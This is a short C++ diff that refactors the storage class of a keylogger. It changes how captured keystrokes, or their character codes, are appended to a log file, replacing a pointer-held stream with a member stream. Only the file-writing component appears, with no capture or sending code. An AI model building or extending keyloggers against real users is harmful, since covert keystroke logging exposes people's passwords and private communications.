@@ -1,32 +1,28 @@
 #include "./keylogger_local.hpp"
 
 keylogger_local::keylogger_local(string p_destination_path) :
-		keylogger()
+		keylogger(), m_ofstream()
 {
-	a_ofstream = new ofstream();
-
-	a_ofstream->open(p_destination_path.c_str(), std::ofstream::out
+	m_ofstream.open(p_destination_path.c_str(), std::ofstream::out
 			| std::ofstream::app);
 }
 
 keylogger_local::~keylogger_local()
 {
-	a_ofstream->close();
-
-	delete a_ofstream;
+	m_ofstream.close();
 }
 
 void keylogger_local::store()
 {
-	if(a_store_character == true)
-		*a_ofstream << *a_buffer << endl;
+	if(m_store_character == true)
+		m_ofstream << m_buffer << endl;
 	else
-		for (int index = 0; (*a_buffer)[index] != '\0'; index++)
+		for (int index = 0; m_buffer[index] != '\0'; index++)
 		{
-			*a_ofstream << (int) a_buffer->at(index) << endl;
+			m_ofstream << (int) m_buffer.at(index) << endl;
 		}
 
-	a_ofstream->flush();
+	m_ofstream.flush();
 
-	a_buffer->clear();
+	m_buffer.clear();
 }
